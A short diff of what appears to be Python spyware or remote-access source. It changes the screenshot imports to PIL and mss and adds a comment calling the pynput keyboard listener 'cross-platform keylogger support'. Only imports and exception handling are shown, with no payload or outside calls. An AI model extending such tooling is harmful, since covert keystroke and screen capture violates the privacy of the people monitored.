@@ -12,11 +12,14 @@ import io
 import psutil
 import subprocess
 import threading
-import pyscreenshot
+from PIL import ImageGrab , Image
+import mss
 from datetime import datetime
-import Xlib
+# Cross-platform keylogger support
 try:
     from pynput.keyboard import Listener
     HAVE_X = True
-except Xlib.error.DisplayNameError:
+except ImportError:
+    HAVE_X = False
+except Exception:
     HAVE_X = False
